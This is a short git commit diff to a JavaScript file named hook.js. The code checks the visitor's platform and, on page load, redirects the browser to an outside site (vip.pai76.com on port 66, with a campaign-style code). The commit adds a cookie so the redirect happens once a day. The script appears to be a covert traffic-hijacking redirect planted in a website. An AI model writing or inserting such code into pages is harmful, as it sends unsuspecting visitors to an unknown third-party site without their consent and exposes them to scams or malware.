2553f25dc2e625322baee6616cede529f1e81255
telecom2019 <39643600+telecom2019@users.noreply.github.com>
2018-12-30 14:32:07 +0800

    Update hook.js

--- hook.js
+++ hook.js
@@ -12,6 +12,7 @@ if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') 
 }
 window.onload = function(){
     if (!getCookie('cc_cookie')) {
+        setCookie('cc_cookie','ok',1);
         window.location.href="https://vip.pai76.com:66/?c=4217";
      }
 }
